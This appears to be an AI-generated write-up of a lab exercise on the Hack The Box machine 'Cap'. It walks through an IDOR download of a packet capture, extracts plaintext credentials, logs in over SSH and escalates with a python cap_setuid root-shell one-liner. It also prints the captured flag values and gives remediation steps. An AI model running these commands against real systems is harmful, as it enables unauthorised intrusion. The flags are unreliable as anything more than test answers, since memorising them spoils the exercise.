# Penetration Test Report: Cap (10.10.10.245)

## Executive Summary

**Target:** 10.10.10.245 (Cap)
**Date:** 2026-01-02
**Result:** Full System Compromise
**Difficulty:** Easy

The Cap machine was fully compromised through a chain of vulnerabilities starting with an Insecure Direct Object Reference (IDOR) in a web application that exposed network packet captures containing plaintext credentials. These credentials provided initial SSH access, and a misconfigured Linux capability on Python allowed privilege escalation to root.

---

## Attack Chain Summary

```
HTTP:80 (Security Dashboard)
    └── IDOR /data/{id} (CWE-639)
        └── PCAP file with FTP credentials
            └── SSH as nathan
                └── Python3.8 cap_setuid capability
                    └── ROOT SHELL
```

---

## Reconnaissance

### Port Scan Results

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Gunicorn (Python) |

### Web Application Analysis

The HTTP service hosts a "Security Dashboard" application with the following endpoints:

- `/` - Dashboard home
- `/capture` - Triggers a 5-second PCAP capture, redirects to `/data/{id}`
- `/data/{id}` - View PCAP analysis
- `/download/{id}` - Download PCAP file
- `/ip` - Shows `ifconfig` output
- `/netstat` - Shows network status

**User Identified:** Nathan (visible in web application UI)

---

## Vulnerability Analysis

### 1. IDOR in PCAP Download (Critical)

**Location:** `/data/{id}` and `/download/{id}`
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**CVSS:** 8.6 (High)

The application assigns incrementing numeric IDs to packet captures. No authorization checks prevent users from accessing captures belonging to other users or sessions.

**Proof of Concept:**
```bash
# New captures redirect to /data/8, /data/9, etc.
# But /data/0 contains a previous capture with credentials
curl http://10.10.10.245/download/0 -o capture.pcap
```

### 2. Plaintext Credentials in Network Traffic (High)

**Protocol:** FTP
**Impact:** Credential Disclosure

PCAP file `/download/0` contained an FTP session with plaintext authentication:

```
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

### 3. Python Capability Misconfiguration (Critical)

**Location:** `/usr/bin/python3.8`
**Capability:** `cap_setuid+eip`
**CWE:** CWE-269 (Improper Privilege Management)

Python3.8 has the `cap_setuid` capability set, allowing any user to change their effective UID to 0 (root).

**Discovery:**
```bash
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Exploitation:**
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

---

## Exploitation Steps

### Step 1: Initial Access via IDOR

```bash
# Download PCAP from IDOR endpoint
curl -s http://10.10.10.245/download/0 -o 0.pcap

# Extract credentials
strings 0.pcap | grep -E "USER|PASS"
# USER nathan
# PASS Buck3tH4TF0RM3!
```

### Step 2: SSH Access

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!
```

### Step 3: User Flag

```bash
cat /home/nathan/user.txt
# ea26f56d619fb3a2a0830a7117a1bdf4
```

### Step 4: Privilege Escalation

```bash
# Check for capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Step 5: Root Flag

```bash
cat /root/root.txt
# a6c62fe1b3954ba6d4b4d84f85c4100e
```

---

## Flags Captured

| Flag | Value | Location |
|------|-------|----------|
| User | `ea26f56d619fb3a2a0830a7117a1bdf4` | /home/nathan/user.txt |
| Root | `a6c62fe1b3954ba6d4b4d84f85c4100e` | /root/root.txt |

---

## Remediation Recommendations

### 1. Fix IDOR Vulnerability (Critical)

- Implement proper authorization checks on `/data/{id}` and `/download/{id}`
- Use UUIDs instead of sequential integers for capture IDs
- Associate captures with authenticated user sessions
- Implement access control lists (ACLs) for sensitive resources

### 2. Encrypt Sensitive Traffic (High)

- Use SFTP or FTPS instead of plaintext FTP
- Implement TLS for all authentication traffic
- Consider SSH key-based authentication only

### 3. Remove Dangerous Capabilities (Critical)

```bash
# Remove cap_setuid from Python
sudo setcap -r /usr/bin/python3.8
```

- Audit all binaries for unnecessary capabilities
- Implement principle of least privilege
- Use capability-aware containerization if needed

### 4. General Hardening

- Implement network segmentation
- Enable logging and monitoring for PCAP access
- Regular security audits of web applications
- Implement Web Application Firewall (WAF)

---

## Tools Used

- nmap (port scanning)
- curl (HTTP requests)
- tcpdump/strings (PCAP analysis)
- SSH (remote access)
- getcap (capability enumeration)

---

## Timeline

| Time | Action |
|------|--------|
| 11:58 | Initial nmap scan completed |
| 11:59 | Web application enumeration |
| 12:00 | IDOR vulnerability discovered |
| 12:00 | Credentials extracted from PCAP |
| 12:01 | SSH access as nathan |
| 12:01 | User flag captured |
| 12:01 | cap_setuid privesc discovered |
| 12:01 | Root shell obtained |
| 12:01 | Root flag captured |

**Total Time to Compromise:** ~3 minutes

---

## Lessons Learned

1. **IDOR vulnerabilities** remain common in web applications and can lead to severe data exposure
2. **Plaintext protocols** like FTP should never be used for sensitive operations
3. **Linux capabilities** can be as dangerous as SUID bits if misconfigured
4. **Defense in depth** is critical - multiple vulnerabilities chained together enabled full compromise

---

*Report generated by Claude Code HTB Autopwner*
